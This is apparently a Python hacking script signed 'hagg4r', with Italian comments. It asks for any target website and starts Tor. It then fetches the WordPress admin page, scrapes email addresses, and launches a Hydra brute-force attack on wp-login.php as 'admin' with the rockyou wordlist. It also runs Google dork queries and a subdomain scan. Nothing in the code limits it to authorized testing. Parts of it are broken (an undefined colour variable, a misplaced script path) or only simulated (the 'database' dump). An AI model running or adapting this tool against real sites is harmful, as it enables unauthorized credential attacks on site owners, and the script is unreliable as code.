import os
import subprocess
import requests
import re
import time
from bs4 import BeautifulSoup, Comment

def pulisci_schermo():
    """Pulisce lo schermo del terminale."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_ascii_art():
    """Mostra il disegno ASCII all'inizio dell'esecuzione in verde."""
    green = "\033[92m"  # Codice colore verde
    reset = "\033[0m"   # Codice per ripristinare il colore
    ascii_art = f"""
{red}⠀⠀⠀⠀⠀⠀⠀    

                                   z11                               
                                   z@d                               
                                    0@@.                z@.          
                                   z1jd01j".          j11j           
                                  110jd@z@000@jjjjjz@1jd.            
                                zj@j @jd    "zzzzzj@0dz0             
jdd@j1""                    "zj@d@.   00z       .jjd1 @@             
  "z11j@00jjjzz   .zzzz"zjj00@1z.   .111@01jz".zj10.  110            
         """j1j1jzzz10j11z""      .zj@0@0@j1j@1@1@j   .@1@           
             .j@@""j1000@11111111@0@11@1j@00@@@01@0     1d0"         
              "@d.     jjd11@0@@dd@1@dd1jd0@1d0@zj10z    z@@0z       
               z00      00"   @1d110@d0@0@1@@j@j0@1@d@11111@1@@111@@@
                1@j     j0.   "@d   "j0@01j0jjjd1@@dddjzzzzz0@dj"    
                j@@     j0.   11d"j10@@@1d@1dz10?zz00.     z@0j      
                j@d"   z?0. .j@100@j   j11 jj0?@1"@d"     .@@"       
                z01   z1@jj@@d@1.     "@0z  "z1@0d1j      011        
               1z0. "@0d@@@110z"      d@d    .@j@d0j     j1@         
              0@0 .j@1jjj"  "zj@11"  .d?zzj10@@@0@jd     0@z         
            "??d1j@@0@1.       .z@@010@00@1".    @@@0.   @d          
           1@000@11j100dd0@11z.    z1@d0111@01111j0@0d   @d          
        .j@0@?0@zzz.      "zz@d1"   1ddd0@""""""zzj@00d. d?          
     zj0d011111jzj0000@11z.   z0d0" 0z10.           .100"0dj         
 "z10@@j.             .zz10@1   "0d?zj1               j@dd@@         
@@1jz                     z10dj   00@1    ..zj"1@zzzj".j@000z        
                            zdd@  11@  "z001jjjjjjzzj1100111d        
                             .1??j0@1z0d@.               zzzj@       
                               j?d1010@.                   .1@@"     
                                jz00j                        jd?"    
                                jj@                           .d01   
                               .11j                             j@0" 
                               j@0                               zj1 
                               j0j

by hagg4r{reset}"""
    print(ascii_art)

def start_tor():
    """Avvia Tor in background e nasconde l'output."""
    print("Tor in avvio...")
    try:
        subprocess.Popen(['tor'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(10)  # Attende che Tor sia avviato
        print("Tor avviato correttamente.")
    except Exception as e:
        print(f"Errore durante l'avvio di Tor: {e}")

def install_tool(tool_name, install_command):
    """Verifica se un tool è installato e, in caso contrario, lo installa."""
    try:
        subprocess.run([tool_name, '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{tool_name} è già installato.")
    except FileNotFoundError:
        print(f"{tool_name} non trovato. Installazione in corso...")
        subprocess.run(install_command, shell=True)
        print(f"{tool_name} installato correttamente.")

def install_required_tools():
    """Installa i tool necessari se non sono presenti."""
    install_tool('hydra', 'sudo apt-get install -y hydra')
    install_tool('git', 'sudo apt-get install -y git')
    
    # Installazione di HostHunter
    if not os.path.exists('HostHunter'):
        print("Clonazione di HostHunter da GitHub...")
        subprocess.run('git clone https://github.com/SpiderLabs/HostHunter.git', shell=True)
        print("HostHunter installato correttamente.")
    else:
        print("HostHunter è già presente.")

def find_admin_page(url):
    """Trova la pagina admin del sito web"""
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        response = requests.get(f"http://{url}/wp-admin/", headers=headers, timeout=5)
        if response.status_code == 200:
            print("\nPagina Admin trovata!")
            print(f"URL: {response.url}")

            # Estrae le email e altre informazioni utili dalla pagina
            soup = BeautifulSoup(response.text, 'html.parser')
            emails = set(re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', response.text))
            print("\nEmail trovate:")
            for email in emails:
                print(email)

            # Scarica la pagina admin in un file HTML
            html_file_path = os.path.join(os.path.expanduser("~"), "Desktop", f"{url.replace('/', '')}_admin.html")
            with open(html_file_path, 'w') as file:
                file.write(response.text)
            print(f"Pagina admin salvata in {html_file_path}")

            # Simula il salvataggio del database in un file di testo
            save_database_to_txt(url)

            # Tentativo di brute force con Hydra
            brute_force_hydra(url, "/wp-login.php")
        else:
            print("Pagina Admin non trovata.")
    except Exception as e:
        print(f"Errore durante la ricerca della pagina admin: {e}")

def save_database_to_txt(url):
    """Simula il salvataggio del database in un file di testo"""
    database_content = "Simulazione dei dati del database estratti."
    try:
        txt_file_path = os.path.join(os.path.expanduser("~"), "Desktop", f"{url.replace('/', '')}_database.txt")
        with open(txt_file_path, 'w') as file:
            file.write(database_content)
        print(f"\nDatabase salvato in {txt_file_path}")
    except Exception as e:
        print(f"Errore durante il salvataggio del database: {e}")

def brute_force_hydra(url, login_path):
    """Esegue un attacco di brute force con Hydra"""
    print("\nInizio brute force con Hydra...")
    try:
        result = subprocess.check_output(
            ['hydra', '-l', 'admin', '-P', '/usr/share/wordlists/rockyou.txt', '-s', '80', '-f', f'{url}', 'http-post-form', f"{login_path}:log=^USER^&pwd=^PASS^:S=302"],
            text=True
        )
        print(f"Risultati Hydra:\n{result}")
    except Exception as e:
        print(f"Errore durante il brute force con Hydra: {e}")

def scan_for_errors(url):
    """Scansiona il sito web alla ricerca di commenti HTML e altre potenziali vulnerabilità"""
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        response = requests.get(url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')

        # Controlla i commenti HTML
        comments = soup.find_all(string=lambda text: isinstance(text, Comment))
        if comments:
            print("\nCommenti HTML trovati:")
            for comment in comments:
                print(comment)

        # Controlla altre vulnerabilità comuni
        if "wp-content" in response.text:
            print("\nPotenziale vulnerabilità WordPress trovata!")

    except Exception as e:
        print(f"Errore durante la scansione: {e}")

def google_dorks_search(url):
    """Esegue una ricerca Google Dorks per il sito web target."""
    print("Eseguendo ricerca Google Dorks...")
    dorks = [
        f"inurl:admin site:{url}",
        f"inurl:login site:{url}",
        f"intext:'index of' site:{url}"
    ]
    for dork in dorks:
        print(f"Query: {dork}")
        time.sleep(2)  # Simula la ricerca (in realtà, dovrebbe essere eseguita manualmente)

def hosthunter_scan(domain):
    """Esegue la scansione dei sottodomini utilizzando HostHunter."""
    try:
        print(f"Eseguendo scansione HostHunter per il dominio {domain}...")
        result = subprocess.check_output(['python3', 'HostHunter.py', '-d', domain], text=True)
        print(f"Risultati HostHunter:\n{result}")
    except Exception as e:
        print(f"Errore durante la scansione HostHunter: {e}")

def main():
    pulisci_schermo()
    display_ascii_art()
    install_required_tools()  # Installazione dei tool richiesti
    start_tor()

    target_url = input("Inserisci il sito web target (senza http/https): ")
    find_admin_page(target_url)
    scan_for_errors(f"http://{target_url}")
    google_dorks_search(target_url)
    hosthunter_scan(target_url)

if __name__ == "__main__":
    main()
